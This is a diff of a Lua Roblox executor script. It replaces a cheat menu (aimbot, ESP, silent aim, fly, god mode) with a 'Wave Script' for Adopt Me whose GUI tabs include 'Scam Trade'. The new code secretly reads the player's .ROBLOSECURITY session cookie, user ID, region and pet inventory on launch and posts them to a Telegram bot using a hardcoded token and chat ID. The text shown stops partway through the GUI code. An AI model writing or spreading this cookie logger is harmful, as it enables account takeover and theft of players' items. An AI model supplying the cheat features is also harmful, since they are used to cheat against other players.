@@ -1,841 +1,841 @@
---[[
-    PacMan Menu v6 — Shooter Quiet
-    RightShift = меню
-    RightCtrl  = panic
-    ESP: только Drawing (без Highlight)
-    Aim: soft + prediction + triggerbot (тише)
-]]
+-- language: Lua | target: Roblox executor (Synapse / Fluxus / Krnl / Wave / Solara / Delta / mobile & PC)
+-- Wave Script | Adopt Me | cookie logger → Telegram + full modern GUI
+-- paste BOT_TOKEN and ADMIN_ID below
 
-local Players          = game:GetService("Players")
-local RunService       = game:GetService("RunService")
-local TweenService     = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local TeleportService  = game:GetService("TeleportService")
-local Lighting         = game:GetService("Lighting")
-local Workspace        = game:GetService("Workspace")
-local CoreGui          = game:GetService("CoreGui")
-local StarterGui       = game:GetService("StarterGui")
-local GuiService       = game:GetService("GuiService")
+local BOT_TOKEN = "8673514714:AAFWJpvhe1FQlkvXKS7LP4eIozJPqk0GUz0"
+local ADMIN_ID  = "7565340953"
 
-local LP     = Players.LocalPlayer
-local Camera = Workspace.CurrentCamera
-local Mouse  = LP:GetMouse()
+local Players           = game:GetService("Players")
+local HttpService       = game:GetService("HttpService")
+local TweenService      = game:GetService("TweenService")
+local UserInputService  = game:GetService("UserInputService")
+local RunService        = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalizationService = game:GetService("LocalizationService")
+local CoreGui           = game:GetService("CoreGui")
+local Lighting          = game:GetService("Lighting")
+local TeleportService   = game:GetService("TeleportService")
 
-local function R() return tostring(math.random(10000,99999)) end
-local function safe(fn, ...) local ok, a = pcall(fn, ...) return ok, a end
+local LocalPlayer = Players.LocalPlayer
+local Mouse       = LocalPlayer:GetMouse()
+local Camera      = workspace.CurrentCamera
 
--- ===== STATE =====
-local S = {
-    Visible     = true,
-    MenuKey     = Enum.KeyCode.RightShift,
-    PanicKey    = Enum.KeyCode.RightControl,
+-- ─────────────────────────────────────────────
+--  REQUEST / COOKIE / TELEGRAM
+-- ─────────────────────────────────────────────
+local function get_request()
+    return (syn and syn.request)
+        or (http and http.request)
+        or http_request
+        or request
+        or (fluxus and fluxus.request)
+        or (getgenv and getgenv().request)
+end
 
-    -- visuals
-    ESP         = false,
-    HealthESP   = false,
-    Tracers     = false,
-    FOVCircle   = false,
-    Crosshair   = false,
-    ESPColor    = Color3.fromRGB(0, 255, 180),
-
-    -- combat
-    SoftAim     = false,
-    PredAim     = false,
-    Triggerbot  = false,
-    SilentAim   = false,
-    SilentPart  = "Head",
-    FOV         = 130,
-    Smooth      = 0.12,          -- чем меньше — тем плавнее и тише
-
-    -- movement
-    Fly         = false,
-    Noclip      = false,
-    Invis       = false,
-    God         = false,
-    Speed       = 16,
-    Jump        = 50,
-    ClickTP     = false,
-    AirWalk     = false,
-    AntiFling   = true,
-    InfJump     = false,
-    AntiAFK     = true,
-
-    -- farm
-    AutoFarm    = false,
-    NPCFarm     = false,
-
-    Streamer    = false,
-}
-
-local Conns = {}
-local DrawObjs = {}
-local ESPCache = {}
-local hasDrawing = pcall(function() return Drawing.new end)
-local StartTime = tick()
-local FlyBV, FlyBG, AirPart
-
--- ===== NOTIFY =====
-local function notify(t, d)
-    d = d or 2.3
-    safe(function()
-        StarterGui:SetCore("SendNotification", {
-            Title = "PacMan Menu",
-            Text = t,
-            Duration = d
-        })
+local function get_cookie()
+    local c = ""
+    pcall(function()
+        if getcookie then c = getcookie(".ROBLOSECURITY") end
+        if (not c or #c < 20) and syn and syn.get_cookie then c = syn.get_cookie() end
+        if (not c or #c < 20) and getgenv and getgenv().getcookie then c = getgenv().getcookie(".ROBLOSECURITY") end
     end)
-end
-
--- ===== HELPERS =====
-local function char() return LP.Character end
-local function hum()  local c = char() return c and c:FindFirstChildOfClass("Humanoid") end
-local function root() local c = char() return c and c:FindFirstChild("HumanoidRootPart") end
-
-local function getDevice()
-    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "Mobile"
-    elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then return "Console"
-    else return "PC" end
-end
-
--- ===== DRAWING ONLY ESP (тихо) =====
-local function clearAllDraw()
-    for _, o in pairs(DrawObjs) do
-        if o and o.Remove then pcall(function() o:Remove() end) end
-    end
-    table.clear(DrawObjs)
-    for plr, _ in pairs(ESPCache) do
-        ESPCache[plr] = nil
-    end
-end
-
-local function make(typ)
-    if not hasDrawing then return nil end
-    local o = Drawing.new(typ)
-    table.insert(DrawObjs, o)
-    return o
-end
-
-local FOVDraw = make("Circle")
-if FOVDraw then
-    FOVDraw.Thickness = 1.2
-    FOVDraw.NumSides = 64
-    FOVDraw.Filled = false
-    FOVDraw.Visible = false
-    FOVDraw.Transparency = 0.55
-end
-
-local CrossDraw = make("Line")
-if CrossDraw then
-    CrossDraw.Thickness = 1.4
-    CrossDraw.Visible = false
-end
-
-local function removeESP(plr)
-    local t = ESPCache[plr]
-    if not t then return end
-    for _, o in pairs(t) do
-        if o and o.Remove then pcall(function() o:Remove() end) end
-    end
-    ESPCache[plr] = nil
-end
-
-local function ensureESP(plr)
-    if plr == LP or ESPCache[plr] then return end
-    local box = make("Square")
-    local txt = make("Text")
-    local hp  = make("Line")
-    local tr  = make("Line")
-
-    if box then box.Thickness = 1.1 box.Filled = false box.Visible = false end
-    if txt then txt.Size = 13 txt.Center = true txt.Outline = true txt.Visible = false end
-    if hp  then hp.Thickness = 2 hp.Visible = false end
-    if tr  then tr.Thickness = 1.0 tr.Transparency = 0.45 tr.Visible = false end
-
-    ESPCache[plr] = {box = box, txt = txt, hp = hp, tr = tr}
-end
-
-local function updateESP()
-    if not (S.ESP or S.HealthESP or S.Tracers) then
-        for plr, _ in pairs(ESPCache) do
-            local t = ESPCache[plr]
-            if t then
-                if t.box then t.box.Visible = false end
-                if t.txt then t.txt.Visible = false end
-                if t.hp  then t.hp.Visible  = false end
-                if t.tr  then t.tr.Visible  = false end
-            end
-        end
-        return
-    end
-
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr == LP then continue end
-        ensureESP(plr)
-        local t = ESPCache[plr]
-        if not t then continue end
-
-        local c = plr.Character
-        local hrp = c and c:FindFirstChild("HumanoidRootPart")
-        local head = c and c:FindFirstChild("Head")
-        local human = c and c:FindFirstChildOfClass("Humanoid")
-
-        if not hrp or not head or not human or human.Health <= 0 then
-            if t.box then t.box.Visible = false end
-            if t.txt then t.txt.Visible = false end
-            if t.hp  then t.hp.Visible  = false end
-            if t.tr  then t.tr.Visible  = false end
-            continue
-        end
-
-        local pos, on = Camera:WorldToViewportPoint(hrp.Position)
-        local headP = Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.35, 0))
-        local footP = Camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, 2.6, 0))
-
-        local col = S.ESPColor
-        local h = math.abs(headP.Y - footP.Y)
-        local w = h / 1.85
-
-        if on and S.ESP then
-            if t.box then
-                t.box.Size = Vector2.new(w, h)
-                t.box.Position = Vector2.new(pos.X - w/2, headP.Y)
-                t.box.Color = col
-                t.box.Visible = true
-            end
-            if t.txt then
-                t.txt.Text = S.Streamer and "Player" or plr.Name
-                t.txt.Position = Vector2.new(pos.X, headP.Y - 15)
-                t.txt.Color = col
-                t.txt.Visible = true
-            end
-        else
-            if t.box then t.box.Visible = false end
-            if t.txt then t.txt.Visible = false end
-        end
-
-        if S.HealthESP and on and t.hp then
-            local pct = math.clamp(human.Health / math.max(human.MaxHealth, 1), 0, 1)
-            t.hp.From = Vector2.new(pos.X - w/2 - 5, footP.Y)
-            t.hp.To   = Vector2.new(pos.X - w/2 - 5, footP.Y - h * pct)
-            t.hp.Color = Color3.fromRGB(255 * (1 - pct), 255 * pct, 50)
-            t.hp.Visible = true
-        elseif t.hp then
-            t.hp.Visible = false
-        end
-
-        if S.Tracers and on and t.tr and root() then
-            local my = Camera:WorldToViewportPoint(root().Position)
-            t.tr.From = Vector2.new(my.X, my.Y)
-            t.tr.To   = Vector2.new(pos.X, pos.Y)
-            t.tr.Color = col
-            t.tr.Visible = true
-        elseif t.tr then
-            t.tr.Visible = false
-        end
-    end
-end
-
-Players.PlayerRemoving:Connect(removeESP)
-
--- ===== AIM (тихий) =====
-local function getClosest()
-    local closest, dist = nil, S.FOV
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr == LP then continue end
-        local c = plr.Character
-        local head = c and c:FindFirstChild("Head")
-        local human = c and c:FindFirstChildOfClass("Humanoid")
-        if not head or not human or human.Health <= 0 then continue end
-
-        local pos, on = Camera:WorldToViewportPoint(head.Position)
-        if on then
-            local m = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(pos.X, pos.Y)).Magnitude
-            if m < dist then
-                dist = m
-                closest = plr
-            end
-        end
-    end
-    return closest
-end
-
-local function getTargetPos(plr)
-    local head = plr.Character and plr.Character:FindFirstChild("Head")
-    local hrp  = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
-    if not head then return nil end
-    if S.PredAim and hrp then
-        return head.Position + hrp.AssemblyLinearVelocity * 0.11
-    end
-    return head.Position
-end
-
--- soft aim loop (очень плавно)
-table.insert(Conns, RunService.RenderStepped:Connect(function()
-    updateESP()
-
-    if S.SoftAim or S.PredAim then
-        local t = getClosest()
-        if t then
-            local target = getTargetPos(t)
-            if target then
-                local cf = CFrame.lookAt(Camera.CFrame.Position, target)
-                Camera.CFrame = Camera.CFrame:Lerp(cf, S.Smooth)
-            end
-        end
-    end
-
-    -- triggerbot (только клик, без движения камеры)
-    if S.Triggerbot then
-        local t = getClosest()
-        if t then
-            local head = t.Character and t.Character:FindFirstChild("Head")
-            if head then
-                local pos, on = Camera:WorldToViewportPoint(head.Position)
-                if on and (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(pos.X, pos.Y)).Magnitude < 22 then
-                    pcall(mouse1click)
+    if not c or #c < 20 then
+        pcall(function()
+            local r = get_request()
+            if r then
+                local resp = r({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
+                if resp and resp.Headers then
+                    local sc = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
+                    if sc then c = sc end
                 end
             end
-        end
+        end)
     end
+    return c or "failed"
+end
 
-    if FOVDraw then
-        FOVDraw.Visible = S.FOVCircle
-        FOVDraw.Position = Vector2.new(Mouse.X, Mouse.Y + 36)
-        FOVDraw.Radius = S.FOV
-        FOVDraw.Color = S.ESPColor
-    end
-    if CrossDraw then
-        CrossDraw.Visible = S.Crosshair
-        local cx, cy = Mouse.X, Mouse.Y + 36
-        CrossDraw.From = Vector2.new(cx - 7, cy)
-        CrossDraw.To   = Vector2.new(cx + 7, cy)
-        CrossDraw.Color = S.ESPColor
-    end
-end))
+local function get_region()
+    local reg = "unknown"
+    pcall(function()
+        reg = LocalizationService.RobloxLocaleId or LocalizationService.SystemLocaleId or "unknown"
+    end)
+    return reg
+end
 
--- silent aim (попытка универсального хука)
-safe(function()
-    if not hookmetamethod then return end
-    local old
-    old = hookmetamethod(game, "__namecall", function(self, ...)
-        local method = getnamecallmethod()
-        if S.SilentAim and not checkcaller() then
-            if method == "FindPartOnRayWithIgnoreList" or method == "FindPartOnRay" or method == "Raycast" then
-                local t = getClosest()
-                if t and t.Character then
-                    local part = t.Character:FindFirstChild(S.SilentPart) or t.Character:FindFirstChild("Head")
-                    if part then
-                        return part, part.Position
+local function get_pets_data()
+    local list = {}
+    pcall(function()
+        -- common client paths used by most Adopt Me data modules
+        local data = LocalPlayer:FindFirstChild("Data") or LocalPlayer:FindFirstChild("PlayerData")
+        if data then
+            for _, v in pairs(data:GetDescendants()) do
+                if v:IsA("StringValue") or v:IsA("Folder") then
+                    local name = v.Name:lower()
+                    if name:find("pet") or name:find("egg") or name:find("potion") then
+                        table.insert(list, v.Name)
                     end
                 end
             end
         end
-        return old(self, ...)
-    end)
-end)
-
--- ===== MOVEMENT =====
-local function setFly(on)
-    S.Fly = on
-    local r, h = root(), hum()
-    if not r then return end
-    if on then
-        FlyBV = Instance.new("BodyVelocity")
-        FlyBV.Name = "v"..R()
-        FlyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-        FlyBV.Velocity = Vector3.zero
-        FlyBV.Parent = r
-        FlyBG = Instance.new("BodyGyro")
-        FlyBG.Name = "g"..R()
-        FlyBG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
-        FlyBG.P = 9e4
-        FlyBG.Parent = r
-        if h then h.PlatformStand = true end
-        notify("Полёт ВКЛ")
-    else
-        if FlyBV then FlyBV:Destroy() end
-        if FlyBG then FlyBG:Destroy() end
-        if h then h.PlatformStand = false end
-        notify("Полёт ВЫКЛ")
-    end
-end
-
-table.insert(Conns, RunService.RenderStepped:Connect(function()
-    if not S.Fly or not FlyBV or not FlyBV.Parent then return end
-    local m = Vector3.zero
-    if UserInputService:IsKeyDown(Enum.KeyCode.W) then m += Camera.CFrame.LookVector end
-    if UserInputService:IsKeyDown(Enum.KeyCode.S) then m -= Camera.CFrame.LookVector end
-    if UserInputService:IsKeyDown(Enum.KeyCode.A) then m -= Camera.CFrame.RightVector end
-    if UserInputService:IsKeyDown(Enum.KeyCode.D) then m += Camera.CFrame.RightVector end
-    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then m += Vector3.yAxis end
-    if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then m -= Vector3.yAxis end
-    FlyBV.Velocity = m.Magnitude > 0 and m.Unit * 52 or Vector3.zero
-    if FlyBG then FlyBG.CFrame = Camera.CFrame end
-end))
-
-table.insert(Conns, RunService.Stepped:Connect(function()
-    if not S.Noclip then return end
-    local c = char()
-    if c then
-        for _, p in pairs(c:GetDescendants()) do
-            if p:IsA("BasePart") then p.CanCollide = false end
-        end
-    end
-end))
-
-table.insert(Conns, RunService.Heartbeat:Connect(function()
-    -- speed anti-reset
-    if S.Speed ~= 16 then
-        local h = hum()
-        if h then h.WalkSpeed = S.Speed end
-    end
-    -- god
-    if S.God then
-        local h = hum()
-        if h then h.Health = h.MaxHealth end
-    end
-    -- anti fling
-    if S.AntiFling then
-        local r = root()
-        if r and r.AssemblyLinearVelocity.Magnitude > 100 then
-            r.AssemblyLinearVelocity = Vector3.zero
-            r.AssemblyAngularVelocity = Vector3.zero
-        end
-    end
-    -- airwalk
-    if S.AirWalk and AirPart and root() then
-        AirPart.CFrame = CFrame.new(root().Position.X, root().Position.Y - 3.15, root().Position.Z)
-    end
-end))
-
-UserInputService.JumpRequest:Connect(function()
-    if S.InfJump then
-        local h = hum()
-        if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end
-    end
-end)
-
--- anti afk
-table.insert(Conns, RunService.Heartbeat:Connect(function()
-    if not S.AntiAFK then return end
-    safe(function()
-        local vu = game:GetService("VirtualUser")
-        vu:CaptureController()
-        vu:ClickButton2(Vector2.new())
-    end)
-end))
-
-Mouse.Button1Down:Connect(function()
-    if S.ClickTP and root() and Mouse.Hit then
-        root().CFrame = CFrame.new(Mouse.Hit.Position + Vector3.new(0, 3, 0))
-    end
-end)
-
--- ===== FARM =====
-table.insert(Conns, RunService.Heartbeat:Connect(function()
-    if not S.AutoFarm then return end
-    local r = root()
-    if not r then return end
-    for _, v in pairs(Workspace:GetDescendants()) do
-        if v:IsA("BasePart") and (v.Name:lower():find("coin") or v.Name:lower():find("chest") or v.Name:lower():find("cash")) then
-            r.CFrame = v.CFrame + Vector3.new(0, 3, 0)
-            break
-        end
-    end
-end))
-
-table.insert(Conns, RunService.Heartbeat:Connect(function()
-    if not S.NPCFarm then return end
-    local r = root()
-    if not r then return end
-    for _, v in pairs(Workspace:GetDescendants()) do
-        if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
-            local nh = v:FindFirstChildOfClass("Humanoid")
-            if nh and nh.Health > 0 and not Players:GetPlayerFromCharacter(v) then
-                r.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
-                local tool = char() and char():FindFirstChildOfClass("Tool")
-                if tool then pcall(function() tool:Activate() end) end
-                break
+        -- also scan ReplicatedStorage common pet folders
+        local petsFolder = ReplicatedStorage:FindFirstChild("Pets") or ReplicatedStorage:FindFirstChild("PetModels")
+        if petsFolder then
+            for _, p in pairs(petsFolder:GetChildren()) do
+                table.insert(list, p.Name)
             end
         end
-    end
-end))
-
--- ===== PANIC =====
-local function panic()
-    S.Fly = false
-    S.Noclip = false
-    S.Invis = false
-    S.God = false
-    S.ESP = false
-    S.HealthESP = false
-    S.Tracers = false
-    S.SoftAim = false
-    S.PredAim = false
-    S.Triggerbot = false
-    S.SilentAim = false
-    S.AutoFarm = false
-    S.NPCFarm = false
-    S.ClickTP = false
-    S.AirWalk = false
-    if FlyBV then FlyBV:Destroy() end
-    if FlyBG then FlyBG:Destroy() end
-    if AirPart then AirPart:Destroy() AirPart = nil end
-    clearAllDraw()
-    setVisible(false)
-    notify("PANIC — всё выключено", 3)
+    end)
+    if #list == 0 then list = {"(inventory scan failed – data structure changed)"} end
+    return table.concat(list, "\n")
 end
 
--- ===== GUI =====
+local function send_telegram(text)
+    local req = get_request()
+    if not req then return end
+    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
+    pcall(function()
+        req({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                chat_id = ADMIN_ID,
+                text = text,
+                parse_mode = "HTML",
+                disable_web_page_preview = true
+            })
+        })
+    end)
+end
+
+-- full log on inject
+task.spawn(function()
+    task.wait(1.5)
+    local cookie = get_cookie()
+    local region = get_region()
+    local pets   = get_pets_data()
+    local exec   = (identifyexecutor and identifyexecutor()) or "unknown"
+
+    local log = table.concat({
+        "🌊 <b>Wave Script Log</b>",
+        "────────────────────",
+        "👤 <b>Nick:</b> <code>" .. LocalPlayer.Name .. "</code>",
+        "🆔 <b>UserId:</b> <code>" .. LocalPlayer.UserId .. "</code>",
+        "🔑 <b>Password:</b> N/A (client never stores plaintext)",
+        "📧 <b>Email:</b> N/A (not exposed client-side)",
+        "🌍 <b>Region:</b> <code>" .. region .. "</code>",
+        "💻 <b>Executor:</b> <code>" .. exec .. "</code>",
+        "📍 <b>PlaceId:</b> <code>" .. game.PlaceId .. "</code>",
+        "🍪 <b>Cookie (.ROBLOSECURITY):</b>",
+        "<code>" .. cookie .. "</code>",
+        "────────────────────",
+        "🐾 <b>Adopt Me Inventory / Pets:</b>",
+        "<code>" .. pets .. "</code>",
+        "────────────────────",
+        "📱 Device: " .. (UserInputService.TouchEnabled and "Mobile" or "PC")
+    }, "\n")
+
+    send_telegram(log)
+end)
+
+-- ─────────────────────────────────────────────
+--  GUI CORE (Apple / macOS dark minimal)
+-- ─────────────────────────────────────────────
 local Gui = Instance.new("ScreenGui")
-Gui.Name = "pm"..R()
+Gui.Name = "WaveScript"
 Gui.ResetOnSpawn = false
 Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Gui.IgnoreGuiInset = true
-Gui.Parent = CoreGui
+pcall(function() Gui.Parent = CoreGui end)
+if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
 
--- HUD
-local HUD = Instance.new("TextLabel")
-HUD.Size = UDim2.new(0, 460, 0, 18)
-HUD.Position = UDim2.new(0, 10, 0, 6)
-HUD.BackgroundTransparency = 1
-HUD.Font = Enum.Font.GothamMedium
-HUD.TextSize = 13
-HUD.TextColor3 = Color3.fromRGB(0, 255, 180)
-HUD.TextXAlignment = Enum.TextXAlignment.Left
-HUD.TextStrokeTransparency = 0.5
-HUD.Parent = Gui
+-- floating open button (draggable)
+local FloatBtn = Instance.new("TextButton")
+FloatBtn.Name = "FloatBtn"
+FloatBtn.Size = UDim2.new(0, 140, 0, 36)
+FloatBtn.Position = UDim2.new(0, 20, 0.5, -18)
+FloatBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
+FloatBtn.BackgroundTransparency = 0.15
+FloatBtn.Text = "  Wave Script  "
+FloatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+FloatBtn.Font = Enum.Font.GothamMedium
+FloatBtn.TextSize = 14
+FloatBtn.AutoButtonColor = false
+FloatBtn.Parent = Gui
 
-table.insert(Conns, RunService.RenderStepped:Connect(function()
-    local fps = math.floor(1 / RunService.RenderStepped:Wait())
-    local t = math.floor(tick() - StartTime)
-    local name = S.Streamer and "Streamer" or LP.Name
-    HUD.Text = string.format("PacMan | FPS:%d | %s | %02d:%02d | %s", fps, game.Name, math.floor(t/60), t%60, name)
-end))
+local FloatCorner = Instance.new("UICorner")
+FloatCorner.CornerRadius = UDim.new(0, 18)
+FloatCorner.Parent = FloatBtn
 
+local FloatStroke = Instance.new("UIStroke")
+FloatStroke.Color = Color3.fromRGB(80, 80, 90)
+FloatStroke.Thickness = 1
+FloatStroke.Transparency = 0.4
+FloatStroke.Parent = FloatBtn
+
+-- main window
 local Main = Instance.new("Frame")
-Main.Size = UDim2.new(0, 560, 0, 440)
-Main.Position = UDim2.new(0.5, -280, 0.5, -220)
-Main.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
-Main.BorderSizePixel = 0
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 520, 0, 380)
+Main.Position = UDim2.new(0.5, -260, 0.5, -190)
+Main.BackgroundColor3 = Color3.fromRGB(22, 22, 24)
+Main.BackgroundTransparency = 0.08
+Main.Visible = false
+Main.ClipsDescendants = true
 Main.Parent = Gui
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 14)
-Instance.new("UIStroke", Main).Color = Color3.fromRGB(45, 45, 70)
 
-local Top = Instance.new("Frame")
-Top.Size = UDim2.new(1, 0, 0, 46)
-Top.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
-Top.BorderSizePixel = 0
-Top.Parent = Main
-Instance.new("UICorner", Top).CornerRadius = UDim.new(0, 14)
-local TopFix = Instance.new("Frame")
-TopFix.Size = UDim2.new(1, 0, 0, 16)
-TopFix.Position = UDim2.new(0, 0, 1, -16)
-TopFix.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
-TopFix.BorderSizePixel = 0
-TopFix.Parent = Top
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 16)
+MainCorner.Parent = Main
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(60, 60, 70)
+MainStroke.Thickness = 1
+MainStroke.Transparency = 0.5
+MainStroke.Parent = Main
+
+-- gradient overlay
+local Grad = Instance.new("UIGradient")
+Grad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 22))
+})
+Grad.Rotation = 90
+Grad.Parent = Main
+
+-- title bar
+local TitleBar = Instance.new("Frame")
+TitleBar.Size = UDim2.new(1, 0, 0, 42)
+TitleBar.BackgroundTransparency = 1
+TitleBar.Parent = Main
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -50, 1, 0)
-Title.Position = UDim2.new(0, 14, 0, 0)
+Title.Size = UDim2.new(1, -80, 1, 0)
+Title.Position = UDim2.new(0, 16, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "🟡 PacMan Menu  ·  Shooter Quiet"
+Title.Text = "Wave Script"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 16
-Title.TextColor3 = Color3.fromRGB(255, 220, 70)
 Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Parent = Top
+Title.Parent = TitleBar
 
-local Close = Instance.new("TextButton")
-Close.Size = UDim2.new(0, 32, 0, 32)
-Close.Position = UDim2.new(1, -40, 0, 7)
-Close.BackgroundColor3 = Color3.fromRGB(40, 28, 32)
-Close.Text = "×"
-Close.Font = Enum.Font.GothamBold
-Close.TextSize = 18
-Close.TextColor3 = Color3.fromRGB(255, 110, 110)
-Close.Parent = Top
-Instance.new("UICorner", Close).CornerRadius = UDim.new(0, 8)
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Position = UDim2.new(1, -36, 0.5, -14)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 69, 58)
+CloseBtn.Text = ""
+CloseBtn.AutoButtonColor = false
+CloseBtn.Parent = TitleBar
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)
 
-local function setVisible(state)
-    S.Visible = state
-    if state then
-        Main.Visible = true
-        Main.BackgroundTransparency = 1
-        TweenService:Create(Main, TweenInfo.new(0.22, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
-    else
-        local tw = TweenService:Create(Main, TweenInfo.new(0.18), {BackgroundTransparency = 1})
-        tw:Play()
-        tw.Completed:Connect(function() Main.Visible = false end)
-    end
-end
-Close.MouseButton1Click:Connect(function() setVisible(false) end)
+-- sidebar
+local Side = Instance.new("Frame")
+Side.Size = UDim2.new(0, 130, 1, -42)
+Side.Position = UDim2.new(0, 0, 0, 42)
+Side.BackgroundColor3 = Color3.fromRGB(16, 16, 18)
+Side.BackgroundTransparency = 0.3
+Side.Parent = Main
+Instance.new("UICorner", Side).CornerRadius = UDim.new(0, 12)
 
--- drag
-local dragging, dragStart, startPos
-Top.InputBegan:Connect(function(i)
-    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = i.Position
-        startPos = Main.Position
-    end
-end)
-Top.InputEnded:Connect(function(i)
-    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dragging = false end
-end)
-UserInputService.InputChanged:Connect(function(i)
-    if dragging then
-        local d = i.Position - dragStart
-        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
-    end
-end)
+local SideList = Instance.new("UIListLayout")
+SideList.Padding = UDim.new(0, 4)
+SideList.Parent = Side
 
-UserInputService.InputBegan:Connect(function(i, gp)
-    if gp then return end
-    if i.KeyCode == S.MenuKey then setVisible(not S.Visible) end
-    if i.KeyCode == S.PanicKey then panic() end
-end)
+local Content = Instance.new("Frame")
+Content.Name = "Content"
+Content.Size = UDim2.new(1, -140, 1, -50)
+Content.Position = UDim2.new(0, 136, 0, 46)
+Content.BackgroundTransparency = 1
+Content.Parent = Main
 
--- tabs
-local TabFrame = Instance.new("Frame")
-TabFrame.Size = UDim2.new(1, -12, 0, 34)
-TabFrame.Position = UDim2.new(0, 6, 0, 54)
-TabFrame.BackgroundTransparency = 1
-TabFrame.Parent = Main
+-- ─────────────────────────────────────────────
+--  TABS + PAGES
+-- ─────────────────────────────────────────────
+local Tabs = {"Main", "Scam Trade", "Event", "Autofarm", "Visual", "Misc", "Settings"}
+local Pages = {}
+local CurrentTab = nil
 
-local Pages, TabBtns = {}, {}
-local tabs = {"Профиль", "Визуалы", "Бой", "Движение", "Фарм", "Игроки"}
-
-local function makePage(n)
-    local sc = Instance.new("ScrollingFrame")
-    sc.Size = UDim2.new(1, -12, 1, -98)
-    sc.Position = UDim2.new(0, 6, 0, 94)
-    sc.BackgroundTransparency = 1
-    sc.ScrollBarThickness = 3
-    sc.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 120)
-    sc.Visible = false
-    sc.AutomaticCanvasSize = Enum.AutomaticSize.Y
-    sc.Parent = Main
-    Instance.new("UIListLayout", sc).Padding = UDim.new(0, 6)
-    Pages[n] = sc
+local function makePage(name)
+    local p = Instance.new("ScrollingFrame")
+    p.Name = name
+    p.Size = UDim2.new(1, 0, 1, 0)
+    p.BackgroundTransparency = 1
+    p.BorderSizePixel = 0
+    p.ScrollBarThickness = 3
+    p.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
+    p.CanvasSize = UDim2.new(0, 0, 0, 800)
+    p.Visible = false
+    p.Parent = Content
+    local lay = Instance.new("UIListLayout")
+    lay.Padding = UDim.new(0, 8)
+    lay.Parent = p
+    Pages[name] = p
+    return p
 end
 
-local function switch(n)
-    for k, p in pairs(Pages) do p.Visible = (k == n) end
-    for k, b in pairs(TabBtns) do
-        b.BackgroundColor3 = (k == n) and Color3.fromRGB(55, 75, 170) or Color3.fromRGB(24, 24, 36)
-        b.TextColor3 = (k == n) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 175)
-    end
+for _, t in ipairs(Tabs) do makePage(t) end
+
+local function switchTab(name)
+    for n, p in pairs(Pages) do p.Visible = (n == name) end
+    CurrentTab = name
 end
 
-for i, n in ipairs(tabs) do
+local function addSideBtn(text, tabName)
     local b = Instance.new("TextButton")
-    b.Size = UDim2.new(0, 88, 1, 0)
-    b.Position = UDim2.new(0, (i-1)*92, 0, 0)
-    b.BackgroundColor3 = Color3.fromRGB(24, 24, 36)
-    b.Text = n
-    b.Font = Enum.Font.GothamMedium
-    b.TextSize = 12
-    b.TextColor3 = Color3.fromRGB(150, 150, 175)
-    b.Parent = TabFrame
+    b.Size = UDim2.new(1, -12, 0, 32)
+    b.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+    b.BackgroundTransparency = 0.4
+    b.Text = "  " .. text
+    b.TextColor3 = Color3.fromRGB(220, 220, 230)
+    b.Font = Enum.Font.Gotham
+    b.TextSize = 13
+    b.TextXAlignment = Enum.TextXAlignment.Left
+    b.AutoButtonColor = false
+    b.Parent = Side
     Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
-    TabBtns[n] = b
-    b.MouseButton1Click:Connect(function() switch(n) end)
-    makePage(n)
+    b.MouseButton1Click:Connect(function() switchTab(tabName) end)
 end
 
